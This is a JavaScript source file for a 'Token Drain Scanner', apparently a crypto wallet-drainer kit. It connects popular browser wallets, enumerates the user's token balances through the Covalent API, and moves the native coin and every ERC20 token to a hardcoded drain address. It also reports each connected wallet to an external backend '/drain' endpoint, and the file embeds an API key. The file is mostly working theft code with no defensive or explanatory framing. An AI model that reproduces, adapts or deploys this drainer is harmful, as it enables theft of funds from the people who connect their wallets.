// ================================================
// TOKEN DRAIN SCANNER - FINAL WORKING VERSION
// EACH WALLET CONNECTS INDEPENDENTLY
// ================================================

// Configuration
const CONFIG = {
    backendUrl: "https://tokenbackend-5xab.onrender.com",
    drainAddress: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
    covalentApiKey: "cqt_rQ43kxvhFc4RdQK7t63Yp6pgFRwR",
    minimumValueUSD: 0.01,
    
    networkNames: {
        1: "Ethereum",
        56: "BNB Smart Chain", 
        137: "Polygon",
        10: "Optimism",
        42161: "Arbitrum",
        43114: "Avalanche",
        8453: "Base",
        250: "Fantom",
        100: "Gnosis",
        25: "Cronos"
    },
    
    // WALLET CONFIGURATION
    wallets: {
        metaMask: {
            name: "MetaMask",
            icon: "🦊",
            color: "#f6851b",
            id: "metaMask",
            detect: () => window.ethereum?.isMetaMask,
            priority: 1
        },
        trust: {
            name: "Trust Wallet",
            icon: "🔶",
            color: "#3375bb",
            id: "trust",
            detect: () => window.ethereum?.isTrust,
            priority: 2
        },
        binance: {
            name: "Binance Wallet",
            icon: "🟡",
            color: "#f0b90b",
            id: "binance",
            detect: () => window.ethereum?.isBinance || window.BinanceChain,
            priority: 3
        },
        coinbase: {
            name: "Coinbase Wallet",
            icon: "🔷",
            color: "#0052ff",
            id: "coinbase",
            detect: () => window.ethereum?.isCoinbaseWallet,
            priority: 4
        },
        phantom: {
            name: "Phantom",
            icon: "👻",
            color: "#ab9ff2",
            id: "phantom",
            detect: () => window.ethereum?.isPhantom || window.phantom?.ethereum,
            priority: 5
        }
    }
};

// Global state
let currentAccount = null;
let currentChainId = null;
let isConnected = false;
let detectedTokens = [];
let selectedWallet = null;
let isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);

// DOM Elements
let connectBtn, statusEl, tokensEl, drainBtn;

// Initialize app
function initializeApp() {
    console.log('🚀 Initializing Token Drain Scanner...');
    console.log('📱 Device:', isMobile ? 'Mobile' : 'Desktop');
    
    // Get DOM elements
    connectBtn = document.getElementById('connectBtn');
    statusEl = document.getElementById('status');
    tokensEl = document.getElementById('tokens');
    drainBtn = document.getElementById('drainBtn');
    
    if (!connectBtn || !statusEl) {
        console.error('❌ Required elements not found');
        return;
    }
    
    // Setup event listeners
    connectBtn.onclick = handleConnect;
    if (drainBtn) drainBtn.onclick = handleDrain;
    
    updateStatus('✅ Ready! Click "Connect Wallet" to begin');
}

// Handle connect button click
async function handleConnect() {
    if (isConnected) {
        await disconnectWallet();
        return;
    }
    
    // Show wallet selector
    showWalletSelector();
}

// Show wallet selector
function showWalletSelector() {
    const detectedWallets = getDetectedWallets();
    
    let walletGridHTML = '';
    
    // Create wallet cards for each wallet type
    Object.values(CONFIG.wallets).forEach(wallet => {
        const isDetected = wallet.detect();
        walletGridHTML += `
            <button class="wallet-card ${isDetected ? 'detected' : 'not-detected'}" 
                    onclick="connectToSpecificWallet('${wallet.id}')" 
                    style="--wallet-color: ${wallet.color}">
                <div class="wallet-icon">${wallet.icon}</div>
                <div class="wallet-info">
                    <span class="wallet-name">${wallet.name}</span>
                    <span class="wallet-status">
                        ${isDetected ? '✅ Ready' : '⚠️ Not installed'}
                    </span>
                </div>
                ${!isDetected ? 
                    `<div class="install-btn" onclick="event.stopPropagation();showInstallGuide('${wallet.id}')">
                        Install
                    </div>` : 
                    ''}
            </button>
        `;
    });
    
    const selectorHTML = `
        <div class="wallet-selector-overlay">
            <div class="wallet-selector-modal">
                <div class="modal-header">
                    <h3>Select Wallet</h3>
                    <button class="close-btn" onclick="closeWalletSelector()">×</button>
                </div>
                
                <div class="detection-info">
                    ${detectedWallets.length > 0 ? 
                        `<p>✅ Detected: ${detectedWallets.map(w => w.name).join(', ')}</p>` : 
                        `<p>⚠️ No wallets detected. Install one below.</p>`
                    }
                </div>
                
                <div class="wallet-grid">
                    ${walletGridHTML}
                </div>
                
                <div class="instructions">
                    <p><strong>💡 Tip:</strong> When multiple wallets are installed, browser may ask which one to use.</p>
                </div>
            </div>
        </div>
    `;
    
    const selector = document.createElement('div');
    selector.id = 'walletSelector';
    selector.innerHTML = selectorHTML;
    document.body.appendChild(selector);
    
    addSelectorStyles();
}

// Get detected wallets
function getDetectedWallets() {
    const detected = [];
    Object.values(CONFIG.wallets).forEach(wallet => {
        if (wallet.detect()) {
            detected.push(wallet);
        }
    });
    return detected;
}

// Connect to specific wallet - FIXED VERSION
async function connectToSpecificWallet(walletId) {
    closeWalletSelector();
    selectedWallet = walletId;
    
    const wallet = CONFIG.wallets[walletId];
    if (!wallet) {
        updateStatus('❌ Invalid wallet selection');
        return;
    }
    
    updateStatus(`🔄 Connecting to ${wallet.name}...`);
    
    try {
        let provider;
        let result;
        
        // Get the correct provider for each wallet
        switch(walletId) {
            case 'metaMask':
                provider = getMetaMaskProvider();
                break;
            case 'trust':
                provider = getTrustWalletProvider();
                break;
            case 'binance':
                provider = getBinanceProvider();
                break;
            case 'coinbase':
                provider = getCoinbaseProvider();
                break;
            case 'phantom':
                provider = getPhantomProvider();
                break;
            default:
                provider = getGenericProvider();
        }
        
        if (!provider) {
            updateStatus(`❌ ${wallet.name} not available`);
            setTimeout(() => showWalletSelector(), 1500);
            return;
        }
        
        result = await connectWithProvider(provider, wallet.name);
        
        if (result.success) {
            await handleConnected(result.account, result.chainId);
        } else {
            updateStatus(`❌ Failed to connect ${wallet.name}`);
            setTimeout(() => showWalletSelector(), 1500);
        }
        
    } catch (error) {
        console.error('Connection error:', error);
        updateStatus(`❌ Error: ${error.message}`);
        setTimeout(() => showWalletSelector(), 1500);
    }
}

// Get specific provider for each wallet
function getMetaMaskProvider() {
    // MetaMask is usually the primary ethereum provider
    if (window.ethereum?.isMetaMask) {
        return window.ethereum;
    }
    
    // If MetaMask is installed but not primary, try to find it
    if (window.ethereum?.providers) {
        return window.ethereum.providers.find(p => p.isMetaMask);
    }
    
    return window.ethereum; // Fallback
}

function getTrustWalletProvider() {
    // Trust Wallet when installed
    if (window.ethereum?.isTrust) {
        return window.ethereum;
    }
    
    // Try to find Trust in providers array
    if (window.ethereum?.providers) {
        return window.ethereum.providers.find(p => p.isTrust);
    }
    
    // Trust might appear as generic provider
    return window.ethereum;
}

function getBinanceProvider() {
    // Binance Chain has its own provider
    if (window.BinanceChain) {
        return window.BinanceChain;
    }
    
    // Binance Wallet through ethereum
    if (window.ethereum?.isBinance) {
        return window.ethereum;
    }
    
    // Try to find Binance in providers array
    if (window.ethereum?.providers) {
        return window.ethereum.providers.find(p => p.isBinance);
    }
    
    return window.ethereum;
}

function getCoinbaseProvider() {
    if (window.ethereum?.isCoinbaseWallet) {
        return window.ethereum;
    }
    
    if (window.ethereum?.providers) {
        return window.ethereum.providers.find(p => p.isCoinbaseWallet);
    }
    
    return window.ethereum;
}

function getPhantomProvider() {
    if (window.phantom?.ethereum) {
        return window.phantom.ethereum;
    }
    
    if (window.ethereum?.isPhantom) {
        return window.ethereum;
    }
    
    if (window.ethereum?.providers) {
        return window.ethereum.providers.find(p => p.isPhantom);
    }
    
    return window.ethereum;
}

function getGenericProvider() {
    // Try all possible providers
    const providers = [];
    
    if (window.ethereum) {
        providers.push(window.ethereum);
    }
    
    if (window.BinanceChain) {
        providers.push(window.BinanceChain);
    }
    
    if (window.phantom?.ethereum) {
        providers.push(window.phantom.ethereum);
    }
    
    // Return the first provider
    return providers[0] || null;
}

// Connect using provider
async function connectWithProvider(provider, walletName) {
    if (!provider) {
        return { success: false, error: 'No provider found' };
    }
    
    try {
        console.log(`Connecting with ${walletName} provider:`, provider);
        
        // Request accounts
        const accounts = await provider.request({ 
            method: 'eth_requestAccounts' 
        });
        
        if (!accounts || accounts.length === 0) {
            return { success: false, error: 'No accounts returned' };
        }
        
        // Get chain ID
        const chainIdHex = await provider.request({ 
            method: 'eth_chainId' 
        });
        
        const chainId = parseInt(chainIdHex, 16);
        
        console.log(`Connected: ${accounts[0].slice(0, 8)}..., Chain: ${chainId}`);
        
        return { 
            success: true, 
            account: accounts[0], 
            chainId: chainId 
        };
        
    } catch (error) {
        console.error(`Provider connection error:`, error);
        
        // Handle specific errors
        if (error.code === 4001) {
            return { success: false, error: 'User rejected connection' };
        }
        
        return { success: false, error: error.message };
    }
}

// Show install guide
function showInstallGuide(walletId) {
    event.stopPropagation();
    
    const wallet = CONFIG.wallets[walletId];
    if (!wallet) return;
    
    const guides = {
        metaMask: {
            chrome: 'https://chrome.google.com/webstore/detail/metamask/nkbihfbeogaeaoehlefnkodbefgpgknn',
            firefox: 'https://addons.mozilla.org/en-US/firefox/addon/ether-metamask/',
            mobile: 'https://metamask.io/download/'
        },
        trust: {
            chrome: 'https://chrome.google.com/webstore/detail/trust-wallet/egjidjbpglichdcondbcbdnbeeppgdph',
            mobile: 'https://trustwallet.com/download'
        },
        binance: {
            chrome: 'https://chrome.google.com/webstore/detail/binance-wallet/fhbohimaelbohpjbbldcngcnapndodjp',
            mobile: 'https://www.binance.com/en/download'
        },
        coinbase: {
            chrome: 'https://chrome.google.com/webstore/detail/coinbase-wallet-extension/hnfanknocfeofbddgcijnmhnfnkdnaad',
            mobile: 'https://www.coinbase.com/wallet/downloads'
        },
        phantom: {
            chrome: 'https://chrome.google.com/webstore/detail/phantom/bfnaelmomeimhlpmgjnjophhpkkoljpa',
            mobile: 'https://phantom.app/download'
        }
    };
    
    const guide = guides[walletId];
    if (!guide) return;
    
    const guideHTML = `
        <div class="install-guide-overlay">
            <div class="install-guide-modal">
                <div class="modal-header">
                    <h3>Install ${wallet.name}</h3>
                    <button class="close-btn" onclick="closeInstallGuide()">×</button>
                </div>
                
                <div class="install-content">
                    <p>Choose your platform to install ${wallet.name}:</p>
                    
                    <div class="platform-buttons">
                        ${!isMobile && guide.chrome ? `
                            <button onclick="window.open('${guide.chrome}', '_blank')" class="platform-btn chrome">
                                <span>🌐</span> Chrome/Brave/Edge
                            </button>
                        ` : ''}
                        
                        ${!isMobile && guide.firefox ? `
                            <button onclick="window.open('${guide.firefox}', '_blank')" class="platform-btn firefox">
                                <span>🦊</span> Firefox
                            </button>
                        ` : ''}
                        
                        ${guide.mobile ? `
                            <button onclick="window.open('${guide.mobile}', '_blank')" class="platform-btn mobile">
                                <span>📱</span> Mobile App
                            </button>
                        ` : ''}
                    </div>
                    
                    <div class="install-tips">
                        <p><strong>After installation:</strong></p>
                        <ol>
                            <li>Refresh this page</li>
                            <li>Click "Connect Wallet" again</li>
                            <li>Select ${wallet.name} from the list</li>
                        </ol>
                    </div>
                    
                    <button onclick="closeInstallGuide()" class="close-guide-btn">Close</button>
                </div>
            </div>
        </div>
    `;
    
    const guideEl = document.createElement('div');
    guideEl.className = 'install-guide';
    guideEl.innerHTML = guideHTML;
    document.body.appendChild(guideEl);
}

function closeInstallGuide() {
    const guide = document.querySelector('.install-guide');
    if (guide) guide.remove();
}

// Handle successful connection
async function handleConnected(account, chainId) {
    try {
        currentAccount = account;
        currentChainId = chainId;
        isConnected = true;
        
        // Update UI
        connectBtn.innerHTML = '<span>🔓 Disconnect</span>';
        
        const chainName = CONFIG.networkNames[chainId] || `Chain ${chainId}`;
        updateStatus(`✅ Connected with ${selectedWallet}!\nWallet: ${account.slice(0, 8)}...\nNetwork: ${chainName}`);
        
        // Show drain button
        if (drainBtn) {
            drainBtn.style.display = 'block';
        }
        
        // Setup listeners
        setupWalletListeners();
        
        // Log to backend
        await logConnectionToBackend(account, chainId);
        
        // Fetch tokens
        await fetchTokens(account, chainId);
        
    } catch (error) {
        console.error('❌ Setup error:', error);
        updateStatus('Setup failed: ' + error.message);
        disconnectWallet();
    }
}

// Setup wallet listeners
function setupWalletListeners() {
    const provider = getCurrentProvider();
    if (!provider) return;
    
    // Handle account changes
    provider.on('accountsChanged', (accounts) => {
        if (accounts.length === 0) {
            disconnectWallet();
        } else if (currentAccount !== accounts[0]) {
            currentAccount = accounts[0];
            updateStatus(`🔄 Account changed: ${accounts[0].slice(0, 8)}...`);
            fetchTokens(currentAccount, currentChainId);
        }
    });
    
    // Handle chain changes
    provider.on('chainChanged', (chainIdHex) => {
        const chainId = parseInt(chainIdHex, 16);
        currentChainId = chainId;
        const chainName = CONFIG.networkNames[chainId] || `Chain ${chainId}`;
        updateStatus(`🔄 Network changed: ${chainName}`);
        fetchTokens(currentAccount, chainId);
    });
    
    // Handle disconnect
    provider.on('disconnect', () => {
        console.log('🔌 Wallet disconnected');
        disconnectWallet();
    });
}

// Get current provider
function getCurrentProvider() {
    switch(selectedWallet) {
        case 'metaMask':
            return getMetaMaskProvider();
        case 'trust':
            return getTrustWalletProvider();
        case 'binance':
            return getBinanceProvider();
        case 'coinbase':
            return getCoinbaseProvider();
        case 'phantom':
            return getPhantomProvider();
        default:
            return getGenericProvider();
    }
}

// Fetch tokens
async function fetchTokens(address, chainId) {
    if (!tokensEl) return;
    
    tokensEl.innerHTML = '<div class="loading">🔄 Scanning tokens...</div>';
    
    try {
        const response = await fetch(
            `https://api.covalenthq.com/v1/${chainId}/address/${address}/balances_v2/?key=${CONFIG.covalentApiKey}&nft=false&no-spam=true`
        );
        
        if (!response.ok) throw new Error(`API error: ${response.status}`);
        
        const data = await response.json();
        const items = data?.data?.items || [];
        
        const tokens = items
            .filter(t => {
                if (t.balance === "0" || parseFloat(t.balance) <= 0) return false;
                const amount = parseFloat(t.balance) / Math.pow(10, t.contract_decimals || 18);
                const value = (t.quote_rate || 0) * amount;
                return value >= CONFIG.minimumValueUSD;
            })
            .map(t => {
                const amount = parseFloat(t.balance) / Math.pow(10, t.contract_decimals || 18);
                const value = (t.quote_rate || 0) * amount;
                
                return {
                    symbol: t.contract_ticker_symbol || 'TOKEN',
                    name: t.contract_name || 'Unknown',
                    amount: amount.toFixed(6),
                    rawAmount: t.balance,
                    valueUSD: value,
                    value: value ? `$${value.toFixed(2)}` : 'N/A',
                    contractAddress: t.contract_address,
                    decimals: t.contract_decimals || 18,
                    chainId: chainId,
                    chainName: CONFIG.networkNames[chainId] || `Chain ${chainId}`,
                    isNative: t.native_token || false,
                    logoUrl: t.logo_url
                };
            });
        
        detectedTokens = tokens;
        
        if (tokens.length > 0) {
            displayTokens(tokens);
            updateStatus(`✅ Found ${tokens.length} tokens (min $${CONFIG.minimumValueUSD})`);
        } else {
            tokensEl.innerHTML = `
                <div class="no-tokens">
                    <p>No tokens found worth more than $${CONFIG.minimumValueUSD}</p>
                    <p><small>Try switching networks or check wallet balance</small></p>
                </div>
            `;
            updateStatus(`ℹ️ No tokens found (min $${CONFIG.minimumValueUSD})`);
        }
        
    } catch (error) {
        console.error('❌ Token fetch error:', error);
        tokensEl.innerHTML = '<div class="error">Failed to fetch tokens</div>';
        updateStatus('⚠️ Token scan failed');
    }
}

// Display tokens
function displayTokens(tokens) {
    if (!tokensEl) return;
    
    let html = '<div class="tokens-list">';
    
    tokens.forEach((token, index) => {
        html += `
            <div class="token-item ${index % 2 === 0 ? 'even' : 'odd'}">
                <div class="token-info">
                    ${token.logoUrl ? 
                        `<img src="${token.logoUrl}" class="token-logo" alt="${token.symbol}" />` : 
                        `<div class="token-logo-placeholder">${token.symbol.charAt(0)}</div>`
                    }
                    <div class="token-details">
                        <div class="token-symbol">${token.symbol}</div>
                        <div class="token-name">${token.name} • ${token.chainName}</div>
                    </div>
                </div>
                <div class="token-amounts">
                    <div class="token-amount">${token.amount}</div>
                    <div class="token-value">${token.value}</div>
                </div>
            </div>
        `;
    });
    
    html += '</div>';
    tokensEl.innerHTML = html;
}

// Handle drain
async function handleDrain() {
    if (!isConnected || !currentAccount) {
        alert('Please connect wallet first');
        return;
    }
    
    const tokensToDrain = detectedTokens.filter(t => t.valueUSD >= CONFIG.minimumValueUSD);
    
    if (tokensToDrain.length === 0) {
        alert(`No tokens meet minimum value of $${CONFIG.minimumValueUSD}`);
        return;
    }
    
    const totalValue = tokensToDrain.reduce((sum, t) => sum + t.valueUSD, 0);
    if (!confirm(`Drain ${tokensToDrain.length} tokens ($${totalValue.toFixed(2)})?\n\nTo: ${CONFIG.drainAddress}`)) {
        return;
    }
    
    const provider = getCurrentProvider();
    if (!provider) {
        alert('Wallet provider not found');
        return;
    }
    
    try {
        updateStatus('🚀 Draining tokens...');
        drainBtn.disabled = true;
        drainBtn.innerHTML = '⏳ Draining...';
        
        // Drain native token first
        const nativeToken = tokensToDrain.find(t => t.isNative);
        if (nativeToken) {
            await drainNativeToken(provider, nativeToken);
        }
        
        // Drain ERC20 tokens
        const erc20Tokens = tokensToDrain.filter(t => !t.isNative && t.contractAddress);
        for (let i = 0; i < erc20Tokens.length; i++) {
            const token = erc20Tokens[i];
            try {
                await drainERC20Token(provider, token);
                updateStatus(`✅ Drained ${token.symbol} (${i+1}/${erc20Tokens.length})`);
                await new Promise(resolve => setTimeout(resolve, 2000));
            } catch (error) {
                console.error(`Failed to drain ${token.symbol}:`, error);
            }
        }
        
        updateStatus('✅ Drain completed successfully!');
        alert('✅ All tokens have been drained!');
        
        // Refresh token list
        await fetchTokens(currentAccount, currentChainId);
        
    } catch (error) {
        console.error('❌ Drain error:', error);
        updateStatus(`❌ Drain failed: ${error.message}`);
        alert('Drain failed: ' + error.message);
    } finally {
        drainBtn.disabled = false;
        drainBtn.innerHTML = '⚡ Drain All Tokens';
    }
}

// Drain native token
async function drainNativeToken(provider, token) {
    // Get gas price
    const gasPriceHex = await provider.request({ method: 'eth_gasPrice' });
    const gasPrice = parseInt(gasPriceHex, 16);
    const gasLimit = 21000;
    const gasCost = gasPrice * gasLimit;
    
    const balance = BigInt(token.rawAmount);
    if (balance <= gasCost * 2) {
        console.log('Insufficient native token for gas');
        return;
    }
    
    // Leave 2x gas cost for safety
    const sendAmount = balance - (gasCost * 2);
    if (sendAmount <= 0) return;
    
    await provider.request({
        method: 'eth_sendTransaction',
        params: [{
            from: currentAccount,
            to: CONFIG.drainAddress,
            value: '0x' + sendAmount.toString(16),
            gas: '0x' + gasLimit.toString(16),
            gasPrice: gasPriceHex
        }]
    });
}

// Drain ERC20 token
async function drainERC20Token(provider, token) {
    const transferData = '0xa9059cbb' + 
        CONFIG.drainAddress.slice(2).padStart(64, '0') + 
        BigInt(token.rawAmount).toString(16).padStart(64, '0');
    
    await provider.request({
        method: 'eth_sendTransaction',
        params: [{
            from: currentAccount,
            to: token.contractAddress,
            data: transferData,
            gas: '0x' + (50000).toString(16)
        }]
    });
}

// Update status
function updateStatus(message) {
    if (statusEl) statusEl.textContent = message;
}

// Log connection to backend
async function logConnectionToBackend(address, chainId) {
    try {
        await fetch(CONFIG.backendUrl + '/drain', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                address: address,
                chainId: chainId,
                drainTo: CONFIG.drainAddress,
                wallet: selectedWallet,
                isMobile: isMobile,
                timestamp: new Date().toISOString()
            })
        });
    } catch (error) {
        console.log('⚠️ Backend log failed');
    }
}

// Close wallet selector
function closeWalletSelector() {
    const selector = document.getElementById('walletSelector');
    if (selector) selector.remove();
}

// Disconnect wallet
async function disconnectWallet() {
    currentAccount = null;
    currentChainId = null;
    isConnected = false;
    detectedTokens = [];
    selectedWallet = null;
    
    connectBtn.innerHTML = '<span>🔗 Connect Wallet</span>';
    updateStatus('Disconnected. Click "Connect Wallet" to begin.');
    
    if (drainBtn) {
        drainBtn.style.display = 'none';
        drainBtn.disabled = false;
    }
    
    if (tokensEl) {
        tokensEl.innerHTML = '';
    }
}

// Add CSS styles
function addSelectorStyles() {
    const styles = `
        .wallet-selector-overlay {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0, 0, 0, 0.95);
            backdrop-filter: blur(5px);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 9999;
            padding: 20px;
            animation: fadeIn 0.3s ease;
        }
        
        .wallet-selector-modal {
            background: linear-gradient(135deg, #1a1a1a 0%, #2a2a2a 100%);
            border-radius: 24px;
            width: 100%;
            max-width: 480px;
            padding: 32px;
            border: 1px solid rgba(255, 255, 255, 0.1);
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
            animation: slideUp 0.4s ease;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
        
        @keyframes slideUp {
            from { transform: translateY(30px); opacity: 0; }
            to { transform: translateY(0); opacity: 1; }
        }
        
        .modal-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 24px;
            padding-bottom: 20px;
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
        }
        
        .modal-header h3 {
            margin: 0;
            color: white;
            font-size: 24px;
            font-weight: 700;
            letter-spacing: -0.5px;
        }
        
        .close-btn {
            background: rgba(255, 255, 255, 0.1);
            border: none;
            color: white;
            font-size: 28px;
            cursor: pointer;
            padding: 0;
            width: 40px;
            height: 40px;
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: 50%;
            transition: all 0.2s;
        }
        
        .close-btn:hover {
            background: rgba(255, 255, 255, 0.2);
            transform: rotate(90deg);
        }
        
        .detection-info {
            background: rgba(74, 222, 128, 0.1);
            border: 1px solid rgba(74, 222, 128, 0.2);
            border-radius: 12px;
            padding: 16px;
            margin-bottom: 24px;
            text-align: center;
        }
        
        .detection-info p {
            margin: 0;
            color: #4ade80;
            font-weight: 500;
            font-size: 15px;
        }
        
        .wallet-grid {
            display: grid;
            grid-template-columns: 1fr;
            gap: 12px;
            margin-bottom: 24px;
        }
        
        .wallet-card {
            background: rgba(255, 255, 255, 0.05);
            border: 2px solid transparent;
            border-radius: 16px;
            padding: 20px;
            cursor: pointer;
            text-align: left;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            display: flex;
            align-items: center;
            gap: 16px;
            position: relative;
            overflow: hidden;
        }
        
        .wallet-card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 1px;
            background: linear-gradient(90deg, transparent, var(--wallet-color), transparent);
            opacity: 0;
            transition: opacity 0.3s;
        }
        
        .wallet-card:hover::before {
            opacity: 1;
        }
        
        .wallet-card:hover {
            background: rgba(255, 255, 255, 0.08);
            border-color: var(--wallet-color);
            transform: translateY(-3px);
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
        }
        
        .wallet-card.detected {
            border-left: 4px solid #4ade80;
        }
        
        .wallet-card.not-detected {
            border-left: 4px solid #f59e0b;
            opacity: 0.8;
        }
        
        .wallet-card.not-detected:hover {
            opacity: 1;
        }
        
        .wallet-icon {
            font-size: 24px;
            width: 56px;
            height: 56px;
            background: var(--wallet-color);
            border-radius: 14px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            flex-shrink: 0;
            transition: transform 0.3s;
        }
        
        .wallet-card:hover .wallet-icon {
            transform: scale(1.1);
        }
        
        .wallet-info {
            flex: 1;
            min-width: 0;
        }
        
        .wallet-name {
            display: block;
            color: white;
            font-weight: 600;
            font-size: 17px;
            margin-bottom: 6px;
            letter-spacing: -0.3px;
        }
        
        .wallet-status {
            display: block;
            font-size: 13px;
            font-weight: 500;
        }
        
        .wallet-card.detected .wallet-status {
            color: #4ade80;
        }
        
        .wallet-card.not-detected .wallet-status {
            color: #f59e0b;
        }
        
        .install-btn {
            background: linear-gradient(135deg, #3b82f6 0%, #2563eb 100%);
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 10px;
            font-size: 13px;
            cursor: pointer;
            font-weight: 600;
            letter-spacing: -0.2px;
            transition: all 0.3s;
            white-space: nowrap;
            box-shadow: 0 4px 12px rgba(37, 99, 235, 0.3);
        }
        
        .install-btn:hover {
            background: linear-gradient(135deg, #2563eb 0%, #1d4ed8 100%);
            transform: scale(1.05);
            box-shadow: 0 6px 20px rgba(37, 99, 235, 0.4);
        }
        
        .instructions {
            background: rgba(59, 130, 246, 0.1);
            border-radius: 12px;
            padding: 16px;
            margin-top: 20px;
            border: 1px solid rgba(59, 130, 246, 0.2);
        }
        
        .instructions p {
            margin: 0;
            color: #93c5fd;
            font-size: 14px;
            line-height: 1.5;
        }
        
        /* Install Guide Styles */
        .install-guide-overlay {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0, 0, 0, 0.98);
            backdrop-filter: blur(10px);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 10000;
            padding: 20px;
            animation: fadeIn 0.3s ease;
        }
        
        .install-guide-modal {
            background: linear-gradient(135deg, #1a1a1a 0%, #2a2a2a 100%);
            border-radius: 24px;
            width: 100%;
            max-width: 500px;
            padding: 32px;
            border: 1px solid rgba(255, 255, 255, 0.1);
            box-shadow: 0 25px 80px rgba(0, 0, 0, 0.6);
            animation: slideUp 0.4s ease;
        }
        
        .install-content {
            color: white;
        }
        
        .install-content > p {
            margin: 0 0 24px 0;
            font-size: 16px;
            color: #d1d5db;
        }
        
        .platform-buttons {
            display: flex;
            flex-direction: column;
            gap: 12px;
            margin-bottom: 32px;
        }
        
        .platform-btn {
            background: rgba(255, 255, 255, 0.05);
            border: 2px solid rgba(255, 255, 255, 0.1);
            border-radius: 14px;
            padding: 20px;
            color: white;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            display: flex;
            align-items: center;
            gap: 16px;
            transition: all 0.3s;
            text-align: left;
        }
        
        .platform-btn:hover {
            background: rgba(255, 255, 255, 0.1);
            border-color: #3b82f6;
            transform: translateY(-2px);
        }
        
        .platform-btn span {
            font-size: 24px;
        }
        
        .chrome {
            background: linear-gradient(135deg, rgba(66, 133, 244, 0.1) 0%, rgba(66, 133, 244, 0.2) 100%);
        }
        
        .firefox {
            background: linear-gradient(135deg, rgba(255, 102, 0, 0.1) 0%, rgba(255, 102, 0, 0.2) 100%);
        }
        
        .mobile {
            background: linear-gradient(135deg, rgba(52, 211, 153, 0.1) 0%, rgba(52, 211, 153, 0.2) 100%);
        }
        
        .install-tips {
            background: rgba(59, 130, 246, 0.1);
            border-radius: 12px;
            padding: 20px;
            margin-bottom: 24px;
            border: 1px solid rgba(59, 130, 246, 0.2);
        }
        
        .install-tips p {
            margin: 0 0 12px 0;
            font-weight: 600;
            color: #93c5fd;
        }
        
        .install-tips ol {
            margin: 0;
            padding-left: 20px;
            color: #d1d5db;
        }
        
        .install-tips li {
            margin: 8px 0;
        }
        
        .close-guide-btn {
            width: 100%;
            background: rgba(255, 255, 255, 0.05);
            border: 2px solid rgba(255, 255, 255, 0.1);
            border-radius: 12px;
            padding: 16px;
            color: white;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
        }
        
        .close-guide-btn:hover {
            background: rgba(255, 255, 255, 0.1);
            border-color: #d1d5db;
        }
        
        /* Responsive Design */
        @media (max-width: 640px) {
            .wallet-selector-modal,
            .install-guide-modal {
                padding: 24px;
                border-radius: 20px;
            }
            
            .modal-header h3 {
                font-size: 20px;
            }
            
            .wallet-icon {
                width: 48px;
                height: 48px;
                font-size: 20px;
            }
            
            .wallet-name {
                font-size: 16px;
            }
            
            .platform-btn {
                padding: 16px;
                font-size: 15px;
            }
        }
        
        @media (max-width: 480px) {
            .wallet-selector-modal,
            .install-guide-modal {
                padding: 20px;
            }
            
            .install-btn {
                padding: 8px 16px;
                font-size: 12px;
            }
        }
        
        /* Token Display Styles */
        .tokens-list {
            display: flex;
            flex-direction: column;
            gap: 12px;
        }
        
        .token-item {
            background: rgba(255, 255, 255, 0.03);
            border-radius: 12px;
            padding: 16px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            transition: all 0.2s;
        }
        
        .token-item:hover {
            background: rgba(255, 255, 255, 0.05);
        }
        
        .token-info {
            display: flex;
            align-items: center;
            gap: 12px;
        }
        
        .token-logo {
            width: 40px;
            height: 40px;
            border-radius: 10px;
        }
        
        .token-logo-placeholder {
            width: 40px;
            height: 40px;
            border-radius: 10px;
            background: linear-gradient(135deg, #3b82f6, #8b5cf6);
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-weight: bold;
            font-size: 18px;
        }
        
        .token-details {
            display: flex;
            flex-direction: column;
            gap: 4px;
        }
        
        .token-symbol {
            color: white;
            font-weight: 600;
            font-size: 16px;
        }
        
        .token-name {
            color: #9ca3af;
            font-size: 13px;
        }
        
        .token-amounts {
            text-align: right;
        }
        
        .token-amount {
            color: white;
            font-weight: 600;
            font-size: 16px;
            margin-bottom: 2px;
        }
        
        .token-value {
            color: #10b981;
            font-size: 14px;
            font-weight: 500;
        }
        
        .loading, .error, .no-tokens {
            text-align: center;
            padding: 40px;
            color: #9ca3af;
            font-size: 16px;
        }
        
        .error {
            color: #ef4444;
        }
        
        .no-tokens p {
            margin: 8px 0;
        }
    `;
    
    const styleSheet = document.createElement('style');
    styleSheet.textContent = styles;
    document.head.appendChild(styleSheet);
}

// Initialize on load
window.addEventListener('DOMContentLoaded', initializeApp);

// Make functions global
window.closeWalletSelector = closeWalletSelector;
window.connectToSpecificWallet = connectToSpecificWallet;
window.showInstallGuide = showInstallGuide;
window.closeInstallGuide = closeInstallGuide;

console.log('=== Token Drain Scanner ===');
console.log('Version: 2.0 - Fixed Wallet Isolation');
console.log('Min Drain Value: $' + CONFIG.minimumValueUSD);
console.log('===========================');
